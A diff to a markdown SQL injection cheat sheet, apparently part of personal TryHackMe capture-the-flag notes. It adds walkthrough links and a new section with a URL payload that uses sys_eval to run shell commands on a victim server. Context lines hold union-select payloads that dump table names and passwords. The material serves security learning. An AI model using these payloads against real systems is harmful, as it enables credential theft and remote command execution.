@@ -157,7 +157,7 @@ ls /SecLists/Discovery/Web-Content/common.txt
 
 **Examples**
 
-[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")[the-marketplace.md](../../walkthroughs/tryhackme/the-marketplace.md "mention")
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")[the-marketplace.md](../../walkthroughs/tryhackme/the-marketplace.md "mention")[tryhack3m-sch3ma-d3mon.md](../../walkthroughs/tryhackme/tryhack3m-sch3ma-d3mon.md "mention")
 
 ```
 ' union select group_concat(tbl_name),2,3,4  FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
@@ -169,7 +169,7 @@ ls /SecLists/Discovery/Web-Content/common.txt
 
 **Examples**
 
-[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")[the-marketplace.md](../../walkthroughs/tryhackme/the-marketplace.md "mention")
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")[the-marketplace.md](../../walkthroughs/tryhackme/the-marketplace.md "mention")[tryhack3m-sch3ma-d3mon.md](../../walkthroughs/tryhackme/tryhack3m-sch3ma-d3mon.md "mention")
 
 **Burp**
 
@@ -183,13 +183,29 @@ ls /SecLists/Discovery/Web-Content/common.txt
 
 **Examples**
 
-[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")[the-marketplace.md](../../walkthroughs/tryhackme/the-marketplace.md "mention")
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")[the-marketplace.md](../../walkthroughs/tryhackme/the-marketplace.md "mention")[tryhack3m-sch3ma-d3mon.md](../../walkthroughs/tryhackme/tryhack3m-sch3ma-d3mon.md "mention")
 
 ```
 ' union select group_concat(password),2,3,4  FROM users -- -
 ```
 
 <figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+### SYS\_EVAL <a href="#flag-1---in-banderror-based---curl-method" id="flag-1---in-banderror-based---curl-method"></a>
+
+You can use sys\_eval to run commands
+
+**Examples**
+
+[tryhack3m-sch3ma-d3mon.md](../../walkthroughs/tryhackme/tryhack3m-sch3ma-d3mon.md "mention")
+
+**URL**
+
+```
+http://$VICTIM:8000/os_sqli.php?user=lannister%27%20union%20SELECT%20null,%20null,%20null,%20null,%20sys_eval(%27ls%20%20/home/receipts%27)%20--%20//
+```
+
+## Get field info
 
 ### In-Band/Error Based - Curl Method <a href="#flag-1---in-banderror-based---curl-method" id="flag-1---in-banderror-based---curl-method"></a>
 
